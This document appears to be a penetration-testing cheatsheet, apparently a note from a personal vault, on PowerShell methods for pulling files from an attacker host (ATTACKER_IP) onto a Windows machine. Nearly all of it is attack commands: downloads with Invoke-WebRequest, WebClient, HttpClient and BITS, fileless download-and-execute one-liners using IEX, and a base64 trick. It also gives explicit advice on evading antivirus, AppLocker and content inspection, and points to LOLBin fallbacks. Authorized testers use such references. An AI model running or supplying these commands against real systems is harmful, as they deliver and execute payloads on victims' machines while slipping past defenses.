---
tags: [pentest, transfer, powershell, windows, download, initial-access, web]
type: cheatsheet
phase: 5
---
# PowerShell Download Methods

Multiple ways to download files using PowerShell. Try different methods when one is blocked by AV or AppLocker.

[[00 - README|Folder index]]

## Invoke-WebRequest (most common)

```powershell
Invoke-WebRequest http://ATTACKER_IP/file.exe -OutFile file.exe
# Short alias:
iwr http://ATTACKER_IP/file.exe -o file.exe
```

## System.Net.WebClient (older, sometimes bypasses restrictions)

```powershell
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file.exe','C:\Temp\file.exe')
```

## Download and execute in memory (fileless)

```powershell
# PowerShell script — runs without touching disk
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')

# Same with Invoke-WebRequest
IEX(iwr http://ATTACKER_IP/script.ps1 -UseBasicParsing)
```

## System.Net.HttpClient (.NET 4.5+)

```powershell
$client = New-Object System.Net.Http.HttpClient
$response = $client.GetAsync('http://ATTACKER_IP/file.exe').Result
[IO.File]::WriteAllBytes('C:\Temp\file.exe', $response.Content.ReadAsByteArrayAsync().Result)
```

## BitsTransfer (background download)

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source http://ATTACKER_IP/file.exe -Destination C:\Temp\file.exe
```

## Base64 download (bypass content inspection)

```powershell
$b64 = (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/file.b64')
[IO.File]::WriteAllBytes('C:\Temp\file.exe', [Convert]::FromBase64String($b64))
```

> [!tip] When PowerShell is blocked
> Fall back to LOLBins: [[15 - certutil Download (LOLBin)]] or [[16 - bitsadmin Download (LOLBin)]].

## See also

- [[15 - certutil Download (LOLBin)]]
- [[16 - bitsadmin Download (LOLBin)]]
- [[12 - Python HTTP Server Transfer]]
